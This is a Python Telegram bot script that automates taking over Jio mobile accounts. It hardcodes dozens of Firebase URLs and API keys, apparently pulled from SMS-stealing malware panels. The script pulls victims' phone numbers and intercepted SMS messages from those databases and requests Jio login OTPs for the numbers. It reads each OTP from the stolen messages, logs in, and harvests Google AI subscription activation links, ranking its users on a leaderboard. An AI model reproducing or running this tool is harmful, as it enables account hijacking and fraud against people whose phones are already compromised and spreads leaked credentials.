import telebot
import requests
import threading
import json
import os
import time
import re
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==========================================
# CONFIGURATION
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = os.getenv("ADMIN_ID", "8139558808")
BOT_USERNAME = "@papukhelu_bot"

# Direct Jio API (no looters.shop)
JIO_SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
JIO_VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
JIO_AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
JIO_NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
JIO_ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
JIO_GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
JIO_SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
JIO_CHECK_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"

TELEGRAM_PROXY = os.getenv("TELEGRAM_PROXY", "")

# ==========================================
# HARDCODED FIREBASE PANELS (APK extracted)
# ==========================================
HARDCODED_PANELS = [
    # Public panels (no auth key)
    ("https://e5turnament2-default-rtdb.firebaseio.com", ""),
    ("https://rahulcscperosnl-default-rtdb.firebaseio.com", ""),
    ("https://lovefimus-default-rtdb.firebaseio.com", ""),
    ("https://kumarlive1-default-rtdb.firebaseio.com", ""),
    ("https://myapp-8228a-default-rtdb.firebaseio.com", ""),
    ("https://chfjfj-c2857-default-rtdb.firebaseio.com", ""),
    ("https://dark-274b4-default-rtdb.firebaseio.com", ""),
    ("https://dyydd-c53c8-default-rtdb.firebaseio.com", ""),
    ("https://gjhghjj-3d251-default-rtdb.firebaseio.com", ""),
    ("https://hdjdjdj-a73f2-default-rtdb.firebaseio.com", ""),
    ("https://muajob-29c86-default-rtdb.firebaseio.com", ""),
    ("https://damonps2-pro.firebaseio.com", ""),
    ("https://totla-panel-default-rtdb.firebaseio.com", ""),
    ("https://rt51-6e1df-default-rtdb.firebaseio.com", ""),
    ("https://aaaa-b3749-default-rtdb.firebaseio.com", ""),
    ("https://panel-wala-v16-default-rtdb.firebaseio.com", ""),
    ("https://jayma-9ce22-default-rtdb.firebaseio.com", ""),
    ("https://annapunna-12b79-default-rtdb.firebaseio.com", ""),
    ("https://newappi-7661a-default-rtdb.firebaseio.com", ""),
    ("https://dwala-3d1ff-default-rtdb.firebaseio.com", ""),
    ("https://pinkyrani-default-rtdb.firebaseio.com", ""),
    ("https://komaljah-default-rtdb.firebaseio.com", ""),
    ("https://sbi-yono-i31an-default-rtdb.firebaseio.com", ""),
    ("https://yes2-ead3d-default-rtdb.firebaseio.com", ""),
    ("https://navin512-54d6f-default-rtdb.firebaseio.com", ""),
    ("https://rto-e-chall-4-default-rtdb.firebaseio.com", ""),
    ("https://dyno-1b564-default-rtdb.firebaseio.com", ""),
    ("https://ruff-panel-default-rtdb.firebaseio.com", ""),
    ("https://dogla-de225-default-rtdb.firebaseio.com", ""),
    ("https://gren-ff2af-default-rtdb.firebaseio.com", ""),
    ("https://loda-5029e-default-rtdb.firebaseio.com", ""),
    ("https://mpari-6a6e5-default-rtdb.firebaseio.com", ""),
    ("https://comeback-5b876-default-rtdb.firebaseio.com", ""),
    ("https://strom-90e84-default-rtdb.firebaseio.com", ""),
    ("https://singhaana-6f199-default-rtdb.firebaseio.com", ""),
    ("https://flash-v7powerengine-v7-default-rtdb.firebaseio.com", ""),
    ("https://money-ace2c-default-rtdb.firebaseio.com", ""),
    ("https://vecna-82db2-default-rtdb.firebaseio.com", ""),
    ("https://rajputchuttad-default-rtdb.firebaseio.com", ""),
    ("https://jamtara74-c231e-default-rtdb.firebaseio.com", ""),
    ("https://raja252525raj-4ee9a-default-rtdb.firebaseio.com", ""),
    ("https://raj254346kumar-84033-default-rtdb.firebaseio.com", ""),
    ("https://salasali6990-1171d-default-rtdb.firebaseio.com", ""),
    ("https://rahu80759-ac69b-default-rtdb.firebaseio.com", ""),
    ("https://samar95476-54eb9-default-rtdb.firebaseio.com", ""),
    ("https://samar84900-6f084-default-rtdb.firebaseio.com", ""),
    ("https://pp30-fc7e5-default-rtdb.firebaseio.com", ""),
    ("https://rto9-d2b33-default-rtdb.firebaseio.com", ""),
    ("https://duuu-dc41d-default-rtdb.firebaseio.com", ""),
    ("https://rameshwar-7okt-default-rtdb.firebaseio.com", ""),
    ("https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com", ""),
    ("https://rexxx-4c7a7-default-rtdb.firebaseio.com", ""),
    ("https://bossuun-default-rtdb.firebaseio.com", ""),
    ("https://panel-wala-v11-default-rtdb.firebaseio.com", ""),
    ("https://rantaishita-f7614-default-rtdb.firebaseio.com", ""),
    ("https://smas-8bff8-default-rtdb.firebaseio.com", ""),
    ("https://jamtara181-default-rtdb.firebaseio.com", ""),
    ("https://panel-wala-v70-default-rtdb.firebaseio.com", ""),
    ("https://rto91-2b27f-default-rtdb.firebaseio.com", ""),
    ("https://server14-c6551-default-rtdb.firebaseio.com", ""),
    ("https://projectsb0810-default-rtdb.firebaseio.com", ""),
    ("https://rto-47-b39f4-default-rtdb.firebaseio.com", ""),
    ("https://rc-39-15-default-rtdb.firebaseio.com", ""),
    ("https://yourfirebase-default-rtdb.firebaseio.com", ""),
    ("https://server-2-a095f-default-rtdb.firebaseio.com", ""),
    ("https://server-1-c3501-default-rtdb.firebaseio.com", ""),
    ("https://server-3-e44be-default-rtdb.firebaseio.com", ""),
    ("https://boi-3-8914d-default-rtdb.firebaseio.com", ""),
    ("https://ruhr-4da8f-default-rtdb.firebaseio.com", ""),
    ("https://activity-e16b3-default-rtdb.firebaseio.com", ""),
    ("https://tryagainnew-58f1a-default-rtdb.firebaseio.com", ""),
    ("https://smsgrabbeer-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://rto-44-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://rto-63-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://panel-wala-v1-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://binacallwalahe-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://newgodx-5b008-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://proooh-672e6-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://apna26-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    # Private panels (with API key)
    ("https://gren-ff2af-default-rtdb.firebaseio.com", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    ("https://kashish-700f7-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM"),
    ("https://ridam-c7949-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM"),
    ("https://hack-boss-9de0f-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM"),
    ("https://anand-d7e61-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM"),
    ("https://farhan-565bc-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM"),
    ("https://jonny-9bb2a-default-rtdb.europe-west1.firebasedatabase.app", "AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM"),
    ("https://loda-5029e-default-rtdb.firebaseio.com", "AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8"),
    ("https://mpari-6a6e5-default-rtdb.firebaseio.com", "AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ"),
    ("https://comeback-5b876-default-rtdb.firebaseio.com", "AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM"),
    ("https://strom-90e84-default-rtdb.firebaseio.com", "AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE"),
    ("https://singhaana-6f199-default-rtdb.firebaseio.com", "AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o"),
    ("https://flash-v7powerengine-v7-default-rtdb.firebaseio.com", "AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg"),
    ("https://money-ace2c-default-rtdb.firebaseio.com", "AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk"),
    ("https://vecna-82db2-default-rtdb.firebaseio.com", "AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA"),
    ("https://rajputchuttad-default-rtdb.firebaseio.com", "AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo"),
    ("https://jamtara74-c231e-default-rtdb.firebaseio.com", "AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q"),
    ("https://raja252525raj-4ee9a-default-rtdb.firebaseio.com", "AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0"),
    ("https://raj254346kumar-84033-default-rtdb.firebaseio.com", "AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco"),
    ("https://salasali6990-1171d-default-rtdb.firebaseio.com", "AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs"),
    ("https://rahu80759-ac69b-default-rtdb.firebaseio.com", "AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo"),
    ("https://samar95476-54eb9-default-rtdb.firebaseio.com", "AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q"),
    ("https://samar84900-6f084-default-rtdb.firebaseio.com", "AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0"),
    ("https://pp30-fc7e5-default-rtdb.firebaseio.com", "AIzaSyADzHYWclidHTO9vu1u2Wo51dAClnJaAqg"),
    ("https://rto9-d2b33-default-rtdb.firebaseio.com", "AIzaSyC5pP7ZRx9h_Puc3nvbQ7-O8zzxVPXnl54"),
    ("https://duuu-dc41d-default-rtdb.firebaseio.com", "AIzaSyANb5diLzfmtbkPbZk-UwG-ot4JZhjScsA"),
    ("https://rameshwar-7okt-default-rtdb.firebaseio.com", "AIzaSyBQbjvGvphUOGhjJlGBn7M5c8nSsJDP_XA"),
    ("https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com", "AIzaSyACVxRuQ_vZEFceetyCQbJG6o_KFp2Ggf0"),
    ("https://rexxx-4c7a7-default-rtdb.firebaseio.com", "AIzaSyDnVaMQ1RY6R1SyFy65TO2bOQXOC_b2VRA"),
    ("https://bossuun-default-rtdb.firebaseio.com", "AIzaSyBfQobM5HmnK6khogyF4ytOX7E9N0e_lAQ"),
    ("https://panel-wala-v11-default-rtdb.firebaseio.com", "AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg"),
    ("https://rantaishita-f7614-default-rtdb.firebaseio.com", "AIzaSyAXeDnVzCBt7e-l1x5hb-2GZJr7wifUPDQ"),
    ("https://smas-8bff8-default-rtdb.firebaseio.com", "AIzaSyC6tb3NaodXCW4Qh8KR8xTW5BteUTbwMc8"),
    ("https://jamtara181-default-rtdb.firebaseio.com", "AIzaSyCv4JJw_4ruIYnNjwuWqnvmk4FZz1n7F4M"),
    ("https://panel-wala-v70-default-rtdb.firebaseio.com", "AIzaSyArFzwZ1p3yOaTW-u6pEvjA44nIYIaCnzc"),
    ("https://rto91-2b27f-default-rtdb.firebaseio.com", "AIzaSyAgRUQgmgrRPIJohL5OTqc3tHg77bWtXcI"),
    ("https://server14-c6551-default-rtdb.firebaseio.com", "AIzaSyCt0gdzlqIxnuJH4TUzgEPJD3111w_qkBg"),
    ("https://projectsb0810-default-rtdb.firebaseio.com", "AIzaSyCAKj9lK1TggPOpafxeolFrhVz1hpepVlk"),
    ("https://rto-47-b39f4-default-rtdb.firebaseio.com", "AIzaSyB9qxDIqS7FCqB-jSpqTAw9ipdf9OzIpho"),
    ("https://rc-39-15-default-rtdb.firebaseio.com", "AIzaSyBSbWYMdNYM-0tCYdY-kizOpvzonPW_-1s"),
    ("https://yourfirebase-default-rtdb.firebaseio.com", "AIzaSnB1cdgCf8hSGRjx7sKuzfsmMQ_a2Uk2NlQ"),
    ("https://server-2-a095f-default-rtdb.firebaseio.com", "AIzaSnB1cdgCf8hSGRjx7sKuzfsmMQ_a2Uk2NlQ"),
    ("https://server-1-c3501-default-rtdb.firebaseio.com", "AIzaSnB1cdgCf8hSGRjx7sKuzfsmMQ_a2Uk2NlQ"),
    ("https://server-3-e44be-default-rtdb.firebaseio.com", "AIzaSnB1cdgCf8hSGRjx7sKuzfsmMQ_a2Uk2NlQ"),
    ("https://boi-3-8914d-default-rtdb.firebaseio.com", "AIzaSyDc4HYWT6jdXAZbRB8wAa_I5HwVcffGfgY"),
    ("https://ruhr-4da8f-default-rtdb.firebaseio.com", "AIzaSyCdKKxasC0wyxiW1f2qGOV3b24710-tNJ8"),
    ("https://activity-e16b3-default-rtdb.firebaseio.com", "AIzaSyBg2FWKtNhoFd4Jd_dYIn3U2EUI3bsux4o"),
    ("https://tryagainnew-58f1a-default-rtdb.firebaseio.com", "AIzaSyATn6LDSqEYPCyY-yMKDhzVBO263WmYOqY"),
    ("https://rto-44-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyArFzwZ1p3yOaTW-u6pEvjA44nIYIaCnzc"),
    ("https://rto-63-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyBHNK2QS-P75DLud5130Uo8bUm5j_biKzU"),
    ("https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyBTebmiVIh2_vFMgPJ0heGQDSSGJT6oZNA"),
    ("https://panel-wala-v1-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyArFzwZ1p3yOaTW-u6pEvjA44nIYIaCnzc"),
    ("https://binacallwalahe-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM"),
    ("https://newgodx-5b008-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyAGUGYKDbUX1rFDhnk79dk3_XWIVxmXC-Y"),
    ("https://proooh-672e6-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM"),
    ("https://apna26-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM"),
    ("https://dogla-de225-default-rtdb.firebaseio.com", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    ("https://dadddy-ec5fa-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    ("https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    ("https://kashish-700f7-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    ("https://ridam-c7949-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    ("https://hack-boss-9de0f-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    ("https://anand-d7e61-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    ("https://farhan-565bc-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    ("https://jonny-9bb2a-default-rtdb.europe-west1.firebasedatabase.app", "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"),
    # Duplicate URLs with different region (keep unique)
    ("https://kumarlive1-default-rtdb.firebaseio.com", ""),
    ("https://rahulcscperosnl-default-rtdb.firebaseio.com", ""),
    ("https://lovefimus-default-rtdb.firebaseio.com", ""),
]

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=True, num_threads=50)

# ==========================================
# STORAGE
# ==========================================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LINKS_FILE = os.path.join(SCRIPT_DIR, "gemnifile.txt")
FRESH_FILE = os.path.join(SCRIPT_DIR, "fresh_links.txt")
REDEEMED_FILE = os.path.join(SCRIPT_DIR, "redeemed_links.txt")
SCANNED_FILE = os.path.join(SCRIPT_DIR, "scanned_numbers.txt")
LEADERBOARD_FILE = os.path.join(SCRIPT_DIR, "leaderboard.json")

FILE_LOCK = threading.Lock()
USER_WAITING_FOR = {}
USER_STATE = {}

used_cache = set()
CURRENTLY_PROCESSING = set()
pending_devices = set()
stop_event = threading.Event()
leaderboard_data = {}

# ==========================================
# FILE HELPERS (stockgro_auto.py style)
# ==========================================
def load_used():
    with FILE_LOCK:
        try:
            with open(SCANNED_FILE, "r") as f:
                return set(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            return set()

def save_used(num):
    with FILE_LOCK:
        if num not in used_cache:
            used_cache.add(num)
            with open(SCANNED_FILE, "a") as f:
                f.write(f"{num}\n")

def load_leaderboard():
    global leaderboard_data
    if os.path.exists(LEADERBOARD_FILE):
        try:
            with open(LEADERBOARD_FILE, "r") as f:
                leaderboard_data = json.load(f)
        except Exception:
            leaderboard_data = {}
    else:
        leaderboard_data = {}

def save_leaderboard():
    with open(LEADERBOARD_FILE, "w") as f:
        json.dump(leaderboard_data, f, indent=4, ensure_ascii=False)

# ==========================================
# LINKS LOADER (stockgro_auto.py style — url|||key)
# ==========================================
def parse_profex_link(link):
    match = re.search(r'[?&]s=([A-Za-z0-9+/=]+)', link.strip())
    if match:
        try:
            decoded = base64.b64decode(match.group(1)).decode('utf-8')
            parts = decoded.split('|||')
            if len(parts) == 2 and parts[0] and parts[1]:
                return parts[0].strip(), parts[1].strip()
        except Exception:
            pass
    return None, None

def load_links():
    parsed = []
    # 1. Load hardcoded panels
    for url, key in HARDCODED_PANELS:
        parsed.append((url, key))
    # 2. Load from files (links.txt, gemnifile.txt)
    for fname in [LINKS_FILE, os.path.join(SCRIPT_DIR, "links.txt")]:
        if not os.path.exists(fname):
            continue
        with open(fname, "r") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if '?s=' in line or '&s=' in line:
                    url, key = parse_profex_link(line)
                    if url and key:
                        url = url.rstrip('/')
                        if not url.startswith("http"):
                            url = "https://" + url
                        parsed.append((url, key))
                elif '|||' in line:
                    parts = line.split('|||')
                    url = parts[0].strip().rstrip('/')
                    if not url.startswith("http"):
                        url = "https://" + url
                    parsed.append((url, parts[1].strip()))
                else:
                    url = line.rstrip('/')
                    if not url.startswith("http"):
                        url = "https://" + url
                    parsed.append((url, "dummy"))
    return parsed

# ==========================================
# FIREBASE HELPERS (stockgro_auto.py style)
# ==========================================
def fetch_firebase(url):
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

NUMBER_KEYS = {"mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile",
               "num", "mobileNumber", "msisdn", "phone_no",
               "sim1Number", "sim2Number", "numberSim1", "numberSim2"}

def extract_phone_from_device(device):
    raw = device.get("mobNo", "")
    if not raw or str(raw) in ("", "-", "None"):
        sims = device.get("sims")
        if sims:
            if isinstance(sims, dict):
                sims = list(sims.values())
            if isinstance(sims, list) and len(sims) > 0 and isinstance(sims[0], dict):
                raw = sims[0].get("phoneNumber", "")
    if not raw or str(raw) in ("", "-", "None"):
        raw = device.get("phoneNumber", "")
    if not raw or str(raw) in ("", "-", "None"):
        return ""
    mobile = str(raw).replace("+91", "").replace(" ", "").replace("-", "").strip()
    if len(mobile) == 10 and mobile.isdigit() and mobile[0] in "6789":
        return mobile
    return ""

_PHONE_PATTERNS = [
    re.compile(r'(?:Jio|JIO|Airtel|AIRTEL)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(?:\+?91[-\s]?)([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'Number\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
    re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)'),
]

def extract_phone_from_sms(text):
    for pattern in _PHONE_PATTERNS:
        m = pattern.search(text)
        if m and m.group(1):
            digits = re.sub(r'[^0-9]', '', m.group(1))
            if len(digits) == 10 and digits[0] in '6789':
                return digits
            if len(digits) == 12 and digits.startswith('91') and digits[2] in '6789':
                return digits[2:]
    return None

def extract_phones_from_messages(fb_url, device_id):
    """stockgro_auto.py style — messages node se phone nikalo"""
    try:
        url = f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=150'
        data = fetch_firebase(url)
        if not data or not isinstance(data, dict):
            return []
        phones = set()
        for msg_key, msg_val in data.items():
            if not msg_val or not isinstance(msg_val, dict):
                continue
            text = str(msg_val.get("message", "") or msg_val.get("body", "") or msg_val.get("text", ""))
            if text.strip():
                phone = extract_phone_from_sms(text)
                if phone:
                    phones.add(phone)
        return list(phones)
    except Exception:
        return []

def get_last_message_key(fb_url, device_id):
    try:
        url = f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=1'
        data = fetch_firebase(url)
        if data and isinstance(data, dict):
            keys = list(data.keys())
            if keys:
                return keys[-1]
    except Exception:
        pass
    return ""

def extract_nums_from_obj(obj):
    nums = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in NUMBER_KEYS and isinstance(v, (str, int)):
                digits = re.sub(r'\D', '', str(v))
                if len(digits) == 10 and digits[0] in '6789':
                    nums.append(digits)
                elif len(digits) == 12 and digits.startswith('91') and digits[2] in '6789':
                    nums.append(digits[2:])
            else:
                nums.extend(extract_nums_from_obj(v))
    elif isinstance(obj, list):
        for item in obj:
            nums.extend(extract_nums_from_obj(item))
    return nums

# ==========================================
# OTP POLLING (stockgro_auto.py style)
# ==========================================
def poll_otp(fb_url, device_id, last_key, timeout=30):
    """Poll messages node for Gemini OTP code"""
    print(f"[*] Polling OTP... (Timeout: {timeout}s)")
    start = time.time()
    while time.time() - start < timeout:
        try:
            url = f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=20'
            data = fetch_firebase(url)
            if data and isinstance(data, dict):
                for mk, msg in data.items():
                    if mk <= last_key:
                        continue
                    if not isinstance(msg, dict):
                        continue
                    text = str(msg.get("message", "") or msg.get("body", "") or msg.get("text", ""))
                    sender = str(msg.get("sender", "") or msg.get("from", ""))
                    if not text.strip():
                        continue
                    bl = text.lower()
                    sl = sender.lower()
                    is_jio = any(kw in bl for kw in ['jiopay', 'jio', 'otp', 'verification code'])
                    is_jio = is_jio or any(kw in sl for kw in ['jio', 'jiopay'])
                    if is_jio or 'verification code' in bl or 'otp' in bl:
                        match = re.search(r'(\d{4,6})\s+is your', text, re.IGNORECASE)
                        if not match:
                            match = re.search(r'\b(\d{4,6})\b', text)
                        if match:
                            print(f"  [+] OTP found: {match.group(1)} | From: '{sender}' | Text: '{text[:60]}'")
                            return match.group(1)
        except Exception:
            pass
        elapsed = int(time.time() - start)
        if elapsed > 0 and elapsed % 10 == 0:
            print(f"  [*] Waiting... ({elapsed}s)")
        time.sleep(3)
    return None

# ==========================================
# LINK CHECKER
# ==========================================
def check_link_status(url):
    try:
        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        if r.status_code == 200:
            if "already been used" in r.text.lower() or "redeemed" in r.text.lower():
                return "REDEEMED"
            return "FRESH"
        elif r.status_code == 404:
            return "NOT FOUND"
        return f"Status {r.status_code}"
    except Exception:
        return "ERROR"

# ==========================================
# JIO SESSION MANAGER (shared, cached)
# ==========================================
class JioSession:
    def __init__(self):
        self._session = None
        self._lock = threading.Lock()
        self._jio_cache = {}  # phone -> bool

    def get_session(self):
        with self._lock:
            if self._session is None:
                self._session = requests.Session()
                self._session.headers.update({
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Origin": "https://www.jio.com",
                    "Referer": "https://www.jio.com/selfcare/login/",
                })
                try:
                    self._session.get("https://www.jio.com/selfcare/login/", timeout=10)
                except Exception:
                    pass
            return self._session

    def is_jio(self, phone):
        if phone in self._jio_cache:
            return self._jio_cache[phone]
        try:
            s = self.get_session()
            r = s.get(JIO_CHECK_URL.format(mobile=phone), timeout=10)
            data = r.json()
            result = bool(data.get("primaryService"))
            self._jio_cache[phone] = result
            return result
        except Exception:
            return False

    def send_otp(self, phone):
        s = self.get_session()
        r = s.post(JIO_SEND_OTP_URL,
                   json={"mobileNumber": phone, "loginFlowType": "MOBILE", "alternateNumber": ""},
                   timeout=15)
        return r.json()

    def verify_otp(self, phone, otp):
        s = self.get_session()
        r = s.post(JIO_VERIFY_OTP_URL,
                   json={"mobileNumber": phone, "otp": otp},
                   timeout=15)
        return r.json()

    def get_activation(self):
        s = self.get_session()
        try:
            s.get(JIO_AUTH_URL, headers={"Referer": "https://www.jio.com/selfcare/dashboard/"}, timeout=15)
            s.get(JIO_NAVIGATE_URL, headers={"Referer": "https://www.jio.com/selfcare/dashboard/"}, timeout=15)
            act = s.get(JIO_ACTIVATE_URL, headers={"Referer": "https://www.jio.com/selfcare/googleai/"}, timeout=15).json()
            if str(act.get("errorCode", "200")) != "200":
                return None, act.get("errorMessage", "Activate failed")
            if "already" in str(act.get("errorMessage", "")).lower():
                return None, "already_active"
            google = s.get(JIO_GOOGLE_URL, headers={"Referer": "https://www.jio.com/selfcare/googleai/"}, timeout=15).json()
            if "already" in str(google.get("errorMessage", "")).lower():
                return None, "already_claimed"
            redirect = str(google.get("redirectionURL", ""))
            import html as html_mod
            from urllib.parse import unquote
            text = html_mod.unescape(redirect)
            for _ in range(4):
                decoded = unquote(text)
                if decoded == text:
                    break
                text = decoded
            m = re.search(r"https?://serviceactivation[.]google[.]com/subscription/new/([A-Za-z0-9_-]{50,})(={0,2})", text, re.I)
            if m:
                link = "https://serviceactivation.google.com/subscription/new/" + m.group(1) + m.group(2)
                try:
                    s.get(JIO_SUBMIT_URL, headers={"Referer": "https://www.jio.com/selfcare/googleai/"}, timeout=10)
                except Exception:
                    pass
                return link, None
            return None, "no_link_found"
        except Exception as e:
            return None, str(e)

jio_mgr = JioSession()

# ==========================================
# PROCESS SINGLE NUMBER (optimized)
# ==========================================
def process_single_number(phone, chat_id, first_name, fb_url, device_id):
    print(f"\n{'='*50}")
    print(f"Processing: {phone}")
    print(f"{'='*50}")

    used = load_used()
    if phone in used:
        print(f"  Already used. Skipping.")
        return False

    # Check Jio number (cached)
    if not jio_mgr.is_jio(phone):
        print(f"  Not Jio. Skip.")
        save_used(phone)
        return False

    # 1. Send OTP
    print(f"  [Step 1] Sending OTP...")
    try:
        data = jio_mgr.send_otp(phone)
        if str(data.get("responseCode")) != "200":
            print(f"  OTP failed: {data.get('responseMessage', 'Error')}")
            save_used(phone)
            return False
        print(f"  OTP Sent! {data.get('maskedValue', '')}")
    except Exception as e:
        print(f"  OTP error: {e}")
        save_used(phone)
        return False

    # 2. Poll OTP from Firebase
    last_key = get_last_message_key(fb_url, device_id)
    print(f"  [Step 2] Waiting OTP...")
    otp = poll_otp(fb_url, device_id, last_key, timeout=15)
    if not otp:
        print(f"  No OTP received")
        save_used(phone)
        return False

    # 3. Verify OTP
    print(f"  [Step 3] Verifying...")
    try:
        v_data = jio_mgr.verify_otp(phone, otp)
        if str(v_data.get("responseCode")) != "200":
            print(f"  Verify failed: {v_data}")
            save_used(phone)
            return False
        print(f"  OTP Verified!")
    except Exception as e:
        print(f"  Verify error: {e}")
        save_used(phone)
        return False

    # 4. Get activation link
    print(f"  [Step 4] Getting link...")
    link, err = jio_mgr.get_activation()
    if not link:
        print(f"  Failed: {err}")
        save_used(phone)
        return False

    print(f"  LINK: {link}")

    # 5. Check status & save
    status = check_link_status(link)
    save_used(phone)

    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_id_str = str(chat_id)

    with FILE_LOCK:
        with open(LINKS_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time_now}] {first_name} | {phone} | {status} | {link}\n")
        if "FRESH" in status:
            with open(FRESH_FILE, "a") as ff:
                ff.write(f"{link}\n")
        else:
            with open(REDEEMED_FILE, "a") as rf:
                rf.write(f"{link}\n")
        if user_id_str not in leaderboard_data:
            leaderboard_data[user_id_str] = {"name": first_name, "count": 0}
        leaderboard_data[user_id_str]["count"] += 1
        save_leaderboard()

